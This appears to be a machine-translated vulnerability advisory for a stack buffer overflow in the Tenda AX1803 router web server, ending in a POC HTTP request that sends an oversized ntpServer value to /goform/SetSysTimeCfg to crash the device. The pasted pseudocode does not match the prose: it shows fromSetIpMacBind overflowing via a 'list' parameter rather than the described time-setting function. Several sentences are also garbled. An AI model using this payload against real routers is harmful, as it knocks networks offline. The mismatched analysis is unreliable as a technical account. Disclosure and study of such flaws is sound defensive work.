# Tenda AX1803 v1.0.0.1_2890 Denial-of-service Vulnerability

## Overview

- Manufacturer's website infomation: https://www.tenda.com.cn/profile/contact.html
- Firmware download address: https://www.tenda.com.cn/download/default.html

## Vulnerability description

The vulnerability lies in rootfs_ In / goform / setsystimecfg of / bin / tdhttpd in ubif file system, attackers can access http://ip/goform/SetSysTimeCfg And by setting the ntpserve parameter, the stack buffer overflow can be caused to achieve the effect of router denial of service.

## Vulnerability details

**First unpack the firmware:**

Download the firmware from the manufacturer's official website（ https://www.tenda.com.cn/download/detail-3225.html ）Since the firmware is not encrypted, the Tenda ax1803 v1.0 is encrypted directly through the binwalk tool (command: binwalk - me *. Bin) 0.0.1_ Unpack the 2890 firmware to get rootfs_ UBIFS file system.

**Vulnerability analysis:**

(Note: the following code screenshot is the pseudo-C language code obtained by disassembling and decompiling the / bin / tdhttpd file in rootfs_ubifs through ida7.6_pro_32-bit)

When accessing / goform / setsystimecfg, the user will enter the fromsetsystime function for processing. The following are some pseudo code screenshots and comments of the fromsetsystime function:

![image](https://user-images.githubusercontent.com/97610822/165426822-f2ea66c7-6cee-4d9d-aa61-6af243831158.png)


![image](https://user-images.githubusercontent.com/97610822/165426845-26ab90e6-fa5c-49db-af83-5667d0743fc6.png)


![image](https://user-images.githubusercontent.com/97610822/165426892-4cb36877-5ad7-4251-aa46-d9ca0efb5d1b.png)


When users access http://ip/goform/SetSysTimeCfg Time rootfs_ ubifs  / bin / tdhttpd in will call fromsetsystime to handle this access, and will assign the ntpserver parameter submitted by the post method to the V4 pointer, and then enter an inevitable if branch (analysis has been written in the comments in the pseudo code screenshot). There is a vulnerability code in this if branch: strcpy (& V32 [16], B4). Therefore, you can override the return address of the function as invalid address by setting the ntpserver parameter submitted by V4, that is, post to overflow the boundary of V32, so as to restart the router and cause the effect of denial of service attack

Pseudo code of fromsetsystime function attached:


```
int __fastcall fromSetIpMacBind(int a1)
{
const char *Parameter; // r5
unsigned int v2; // r0
int i; // r4
char *v4; // r0
char *v5; // r11
int v6; // r3
int v7; // r5
int v8; // r2
int v10; // [sp+8h] [bp-440h]
char *nptr; // [sp+10h] [bp-438h]
int v13; // [sp+14h] [bp-434h]
char v14[32]; // [sp+28h] [bp-420h] BYREF
char v15[32]; // [sp+48h] [bp-400h] BYREF
char v16[64]; // [sp+68h] [bp-3E0h] BYREF
char v17[64]; // [sp+A8h] [bp-3A0h] BYREF
char dest[64]; // [sp+E8h] [bp-360h] BYREF
char v19[128]; // [sp+128h] [bp-320h] BYREF
char v20[128]; // [sp+1A8h] [bp-2A0h] BYREF 可以通过设置list参数通过strcpy函数溢出的
栈上变量
char s[256]; // [sp+228h] [bp-220h] BYREF
char v22[288]; // [sp+328h] [bp-120h] BYREF
memset(s, 0, sizeof(s));
memset(v16, 0, sizeof(v16));
memset(v19, 0, sizeof(v19));
nptr = GetParameter(a1, "bindnum", "0");
Parameter = GetParameter(a1, "list", &byte_1E9CC8);// 将访问
ip/goform/SetIpMacBind时post提交的list参数
// 赋值给Parameter变量
GetValue("dhcps.Staticnum", v19);
v13 = atoi(v19);
v2 = atoi(nptr);
v10 = v2;
if ( v2 > 0x20 )
{
printf("staic ip number over %d\n", 32);
goto LABEL_30;
}
for ( i = 1; ; ++i )
{
v6 = Parameter;
if ( Parameter )
v6 = 1;
if ( i > v10 )
v6 = 0;
if ( !v6 )
break;
memset(v20, 0, sizeof(v20));
memset(v17, 0, sizeof(v17));
memset(v22, 0, 0x80u);
memset(v14, 0, sizeof(v14));
memset(v15, 0, sizeof(v15));
memset(dest, 0, sizeof(dest));
v4 = strchr(Parameter, '\n'); // 如果parameter也就是post提交的
list参数中存在换行符，则v4不为零，否则v4为零。
v5 = v4;
if ( v4 ) // v4不为零，也就是提交的list参数中存
在换行符
{
*v4 = 0;
strcpy(v20, Parameter); // 该处strcpy未检验v20边界，故可以通
过Parameter参数来溢出v20的边界以覆盖该函数的返回值，造成设备重启并且达到拒绝服务攻击。
Parameter = v5 + 1;
}
else // v4为零，也就是提交的list参数中无换
行符
{
strcpy(v20, Parameter); // 该处strcpy未检验v20边界，故可以通
过Parameter参数来溢出v20的边界以覆盖该函数的返回值，造成设备重启并且达到拒绝服务攻击。
}
if ( v20[0] == 13 )
{
if ( _isoc99_sscanf(&v20[1], "%17[0-9a-fA-F:]\r%s", v14) != 2 )
goto LABEL_20;
strcpy(dest, &byte_1E9CC8);
}
else if ( _isoc99_sscanf(v20, "%[^\r]\r%[0-9a-fA-F:]\r%s", dest) != 3 )
{
LABEL_20:
v2 = puts("get ip and mac error!");
v6 = 1;
break;
}
printf("%s %d# dev_name=%s,mac_addr=%s,ip_addr=%s\n", "set_mac_bind_list",
543, dest, v14, v15);
sprintf(v17, "dhcps.Staticip%d", i);
sprintf(v22, "%s;%s;0", v15, v14);
v2 = SetValue(v17, v22);
if ( dest[0] )
{
memset(v17, 0, sizeof(v17));
memset(v22, 0, 0x80u);
v2 = sub_62C98(dest, v14);
}
}
v7 = v10 + 1;
if ( i == v10 + 1 )
{
if ( !v6 )
{
puts("set static num sucess!");
v2 = SetValue("dhcps.Staticnum", nptr);
while ( v7 <= v13 )
{
memset(v19, 0, sizeof(v19));
sprintf(v16, "dhcps.Staticip%d", v7);
GetValue(v16, v19);
sprintf(v16, "dhcps.Staticip%d", v7++);
v2 = SetValue(v16, &byte_1E9CC8);
}
goto LABEL_27;
}
LABEL_30:
v8 = 1;
goto LABEL_31;
}
if ( v6 )
goto LABEL_30;
LABEL_27:
if ( sub_8CB38(v2) )
{
memset(v22, 0, 0x100u);
strcpy(v22, "op=200");
send_msg_to_netctrl(19, v22);
}
v8 = 0;
LABEL_31:
sprintf(s, "{\"errCode\":%d}", v8);
return sub_55970(a1, s);
}
```

## POC
```
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: password=bb507bf3973a97a9bf1267699f712550bkcmji
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
ntpServer=a*num
```
(Note: num needs to be greater than 0x134h bytes, that is, if the number of characters to be sent is greater than 0x134h, DoS attack can be caused)










